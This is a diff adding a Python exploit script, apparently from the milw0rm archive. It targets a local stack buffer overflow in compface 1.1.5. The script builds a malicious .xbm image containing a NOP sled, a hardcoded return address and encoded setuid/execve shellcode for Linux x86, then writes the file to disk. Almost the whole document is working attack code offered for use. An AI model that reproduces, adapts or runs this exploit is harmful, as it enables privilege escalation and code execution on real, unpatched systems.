@@ -1,0 +1,41 @@
+#!/usr/bin/python
+#[*] Exploit     :      	Compface '.xbm' Local Buffer Overflow Exploit
+#[*] Affected	 :		compface 1.1.5
+#[*] Tested on   :   		Ubuntu 9.04 (without stack randomization)
+#[*] Refer	 :		bid/35863
+#[*] Exploit     : 		His0k4
+
+#[*] Use : $compface exploit.xbm out
+
+#setuid/execve shellcode for Linux/x86 by Marco Ivaldi
+#[*] x86/alpha_mixed succeeded with size 124 (iteration=1)
+shellcode=(
+"\x89\xe1\xdb\xd1\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
+"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
+"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
+"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
+"\x42\x4a\x42\x37\x50\x58\x50\x31\x49\x4b\x48\x4d\x4d\x50\x42"
+"\x4a\x44\x4b\x50\x58\x4d\x49\x51\x42\x42\x48\x46\x4f\x46\x4f"
+"\x44\x33\x45\x38\x42\x48\x46\x4f\x42\x42\x42\x49\x42\x4e\x4b"
+"\x39\x4d\x33\x51\x42\x50\x53\x4c\x49\x4b\x51\x48\x4d\x4d\x50"
+"\x45\x5a\x41\x41")
+
+payload =  "#define noname_width 48\r\n"
+payload += "#define noname_height 48\r\n"
+payload += "static\r\n"
+payload += "\x90"*180
+payload += "\x80\xf4\xff\xbf" #$esp+10h
+payload += "\x90"*16
+payload += shellcode
+payload += "\r\n"
+payload += "char = {\r\n"
+
+try:
+    out_file = open("exploit.xbm","w")
+    out_file.write(payload)
+    out_file.close()
+    print("\nExploit file created!\n")
+except:
+    print "Error"
+
+# milw0rm.com [2009-07-30]
